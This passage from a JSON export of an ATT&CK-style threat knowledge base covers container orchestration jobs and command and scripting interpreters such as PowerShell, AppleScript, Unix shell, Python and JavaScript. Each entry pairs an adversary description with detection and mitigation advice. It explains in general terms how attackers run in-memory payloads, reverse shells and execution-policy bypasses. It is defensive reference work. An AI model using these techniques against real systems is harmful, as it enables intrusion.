account and prevent users from creating and/or modifying systemd timer unit files."}]},{"id":"T1053.007","name":"Container Orchestration Job","description":"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks. <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Jobs)</a> <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes CronJob)</a> An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster. <a href=\"https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threat Matrix for Kubernetes)</a>","detection":"Monitor for the anomalous creation of scheduled jobs in container orchestration environments. Use logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments.","platforms":["Containers"],"dataSources":["File: File Creation","Container: Container Creation","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate privilege escalation vectors so only authorized administrators can create container orchestration jobs."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a>"}]}]},{"id":"T1059","name":"Command and Scripting Interpreter","description":"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution. <a href=\"https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powershell Remote Commands)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#23\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Command History)</a> <a href=\"https://www.thepythoncode.com/article/executing-bash-commands-remotely-in-python\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Remote Shell Execution in Python)</a>","detection":"Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Script: Script Execution","Process: Process Creation","Process: Process Metadata","Module: Module Load","Command: Command Execution"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."},{"id":"M1026","name":"Privileged Account Management","description":"When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. <a href=\"https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netspi PowerShell Execution Policy Bypass)</a>\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions. <a href=\"https://learn.microsoft.com/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.3\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PS JEA)</a>"},{"id":"M1033","name":"Limit Software Installation","description":"Prevent user installation of unrequired command and scripting interpreters."},{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate. For example, PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., <code>Add-Type</code>). <a href=\"https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PowerShell CLM)</a>"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Visual Basic and JavaScript scripts from executing potentially malicious downloaded content <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable or remove any unnecessary or unused shells or interpreters."},{"id":"M1045","name":"Code Signing","description":"Where possible, only permit execution of signed scripts."},{"id":"M1047","name":"Audit","description":"Inventory systems for unauthorized command and scripting interpreter installations."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically quarantine suspicious files."}],"subTechniques":[{"id":"T1059.001","name":"PowerShell","description":"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. <a href=\"https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet PowerShell)</a> Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack. <a href=\"https://github.com/Exploit-install/PSAttack-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github PSAttack)</a>\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). <a href=\"https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sixdub PowerPick Jan 2016)</a> <a href=\"https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SilentBreak Offensive PS Dec 2015)</a> <a href=\"https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PSfromCsharp APR 2014)</a>","detection":"If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations). <a href=\"https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sixdub PowerPick Jan 2016)</a> <a href=\"https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SilentBreak Offensive PS Dec 2015)</a>\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). <a href=\"http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Archaeology PowerShell Cheat Sheet)</a> PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features. <a href=\"https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye PowerShell Logging 2016)</a> An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.\n\nConsider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the <code>EngineVersion</code> field (which may also be relevant to detecting a potential Downgrade Attack) as well as if PowerShell is running locally or remotely in the <code>HostName</code> field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session. <a href=\"https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: inv_ps_attacks)</a>","platforms":["Windows"],"dataSources":["Script: Script Execution","Process: Process Creation","Process: Process Metadata","Command: Command Execution","Module: Module Load"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. <a href=\"https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netspi PowerShell Execution Policy Bypass)</a>\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions. <a href=\"https://learn.microsoft.com/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.3\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PS JEA)</a>"},{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate. PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., <code>Add-Type</code>). <a href=\"https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PowerShell CLM)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.\n\nDisable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution."},{"id":"M1045","name":"Code Signing","description":"Set PowerShell execution policy to execute only signed scripts."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically quarantine suspicious files."}]},{"id":"T1059.002","name":"AppleScript","description":"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. <a href=\"https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple AppleScript)</a> These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file. <a href=\"https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SentinelOne AppleScript)</a>\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format. <a href=\"https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SentinelOne macOS Red Team)</a> Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python. <a href=\"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Macro Malware Targets Macs)</a>","detection":"Monitor for execution of AppleScript through <code>osascript</code> and usage of the <code>NSAppleScript</code> and <code>OSAScript</code> APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.","platforms":["macOS"],"dataSources":["Command: Command Execution","Process: Process Creation","Process: OS API Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate."},{"id":"M1045","name":"Code Signing","description":"Require that all AppleScript be signed by a trusted developer ID before being executed - this will prevent random AppleScript code from executing. <a href=\"https://www.engadget.com/2013/10/23/applescript-and-automator-gain-new-features-in-os-x-mavericks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: applescript signing)</a> This subjects AppleScript code to the same scrutiny as other .app files passing through Gatekeeper."}]},{"id":"T1059.003","name":"Windows Command Shell","description":"Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH. <a href=\"https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SSH in Windows)</a>\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.","detection":"Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate."}]},{"id":"T1059.004","name":"Unix Shell","description":"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution. <a href=\"https://linux.die.net/man/1/bash\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DieNet Bash)</a> <a href=\"https://support.apple.com/HT208050\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple ZShell)</a> Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.\n\nSome systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.","detection":"Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":["ESXi","Linux","macOS","Network Devices"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate. On ESXi hosts, the <code>execInstalledOnly</code> feature prevents binaries from being run unless they have been packaged and signed as part of a vSphere installation bundle (VIB). <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence ESXi Hardening 2023)</a>"}]},{"id":"T1059.005","name":"Visual Basic","description":"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core. <a href=\"https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VB .NET Mar 2020)</a> <a href=\"https://docs.microsoft.com/dotnet/visual-basic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VB Microsoft)</a>\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. <a href=\"https://docs.microsoft.com/office/vba/api/overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft VBA)</a> <a href=\"https://en.wikipedia.org/wiki/Visual_Basic_for_Applications\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia VBA)</a> VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support). <a href=\"https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft VBScript)</a>\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution). (Citation: Default VBS macros Blocking )","detection":"Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.","platforms":["Linux","macOS","Windows"],"dataSources":["Module: Module Load","Command: Command Execution","Process: Process Creation","Script: Script Execution"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."},{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate. VBA macros obtained from the Internet, based on the file's Mark of the Web (MOTW) attribute, may be blocked from executing in Office applications (ex: Access, Excel, PowerPoint, Visio, and Word) by default starting in Windows Version 2203. (Citation: Default VBS macros Blocking )"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Visual Basic scripts from executing potentially malicious downloaded content <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Turn off or restrict access to unneeded VB components."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically quarantine suspicious files."}]},{"id":"T1059.006","name":"Python","description":"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables. <a href=\"https://www.zscaler.com/blogs/security-research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Zscaler APT31 Covid-19 October 2020)</a>\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.","detection":"Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1033","name":"Limit Software Installation","description":"Prevent users from installing Python where not required."},{"id":"M1038","name":"Execution Prevention","description":"Denylist Python where not required."},{"id":"M1047","name":"Audit","description":"Inventory systems for unauthorized Python installations."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically quarantine suspicious files."}]},{"id":"T1059.007","name":"JavaScript","description":"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser. <a href=\"https://nodejs.org/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NodeJS)</a>\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages. <a href=\"https://docs.microsoft.com/windows/win32/com/translating-to-jscript\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: JScrip May 2018)</a> <a href=\"https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft JScript 2007)</a> <a href=\"https://docs.microsoft.com/scripting/winscript/windows-script-interfaces\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Scripts)</a>\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework. <a href=\"https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple About Mac Scripting 2016)</a> <a href=\"https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps JXA 2020)</a> <a href=\"https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SentinelOne macOS Red Team)</a> <a href=\"https://redcanary.com/blog/clipping-silver-sparrows-wings/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary Silver Sparrow Feb2021)</a> <a href=\"https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MDSec macOS JXA and VSCode)</a>\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.","detection":"Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nMonitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.","platforms":["Linux","macOS","Windows"],"dataSources":["Module: Module Load","Process: Process Creation","Script: Script Execution","Command: Command Execution"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Script blocking extensions can help prevent the execution of JavaScript and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."},{"id":"M1038","name":"Execution Prevention","description":"Denylist scripting where appropriate."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent JavaScript scripts from executing potentially malicious downloaded content <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Turn off or restrict access to unneeded scripting components."}]},{"id":"T1059.008","name":"Network Device CLI","description":"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or SSH.\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a>","detection":"Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#23\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Command History)</a>\n\nConsider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.","platforms":["Network Devices"],"dataSources":["Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Use of Authentication, Authorization, and Accounting (AAA) systems will limit actions users can perform and provide a history of user actions to detect unauthorized use and abuse. Ensure least privilege principles are applied to user accounts and groups so that only authorized users can perform configuration changes. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - AAA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Use of Authentication, Authorization, and Accounting (AAA) systems will limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. TACACS+ can keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization <a 